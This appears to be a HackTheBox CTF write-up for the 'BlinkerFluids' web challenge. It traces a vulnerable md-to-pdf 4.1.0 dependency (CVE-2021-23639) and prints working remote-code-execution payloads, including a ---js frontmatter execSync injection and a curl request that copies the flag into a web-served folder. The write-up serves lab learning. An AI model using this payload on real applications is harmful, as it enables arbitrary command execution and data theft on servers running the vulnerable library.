---
title: BlinkerFluids
slug: htb-blinkerfluids
kind: Challenge
category: Web
date: 2026-09-25
image: web
platform: HackTheBox
difficulty: Easy
points: 200
tags: [hackthebox, retired, challenge, web, rce, nodejs, cve-2021-23639]
description: Exploiting a Blinker Fluids web app that converts Markdown to PDF: source-code review reveals a vulnerable md-to-pdf@4.1.0 dependency (CVE-2021-23639), which allows remote code execution via a malicious ---js frontmatter block. Walkthrough of finding the CVE, crafting the payload, and reading the flag off a web-served path.
path:
  - Source-code review
  - Vulnerability identification
  - Payload crafting
  - Code execution + exfiltration
  - Flag
---

### Challenge Scenario
Once known as an imaginary liquid used in automobiles to make the blinkers work is now one of the rarest fuels invented on Klaus' home planet Vinyr. The Golden Fang army has a free reign over this miraculous fluid essential for space travel thanks to the Blinker Fluids™ Corp. Ulysses has infiltrated this supplier organization's one of the HR department tools and needs your help to get into their server. Can you help him?
### Solution
The website is very simple itself, it's only functionality is converting a markdown into a pdf, which then you can view in their website. Let's look at the source code for a minute and try to find useful information. There is a file here that is very useful for us in /challenge/package.json. The reason that it's useful is that it has the dependencies that the website uses, and also their versions. The library that is used for converting a markdown file to pdf is called `md-to-pdf`, and we have it's version which we can google.
```json
"md-to-pdf": "4.1.0"
```
After researching i found [CVE-2021-23639](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880). It basically says that this version of `md-to-pdf` is vulnerable to Remote Code Execution. And it has a payload as an example, which we will modify to get the flag. 
```js
---js\n((require("child_process")).execSync("id > /tmp/RCE.txt"))\n---RCE
```
Now to get the flag, we need to modify this payload. So it'll copy the contents of the `flag.txt` file into a directory, which is reachable for us. As we can see, when we open any pdf that we make in the website, it takes us to `/static/invoices/XXXXX.pdf`. So we have a permission to open the files, that are located in this directory.
```js
---js\n((require(\"child_process\")).execSync(\"cat /flag.txt > /app/static/invoices/flag.txt\
```
For some reason i couldn't add this payload directly through the website, so i just used `curl` to do that.
```js
curl http://154.57.164.82:30429/api/invoice/add -d '{"markdown_content":"---js\n((require(\"child_process\")).execSync(\"cat /flag.txt > /app/static/invoices/flag.txt\"))\n---RCE"}' -H 'Content-Type: application/json'
```
And now we can successfully grab the flag in:
```
http://154.57.164.82:30429/static/invoices/flag.txt
```
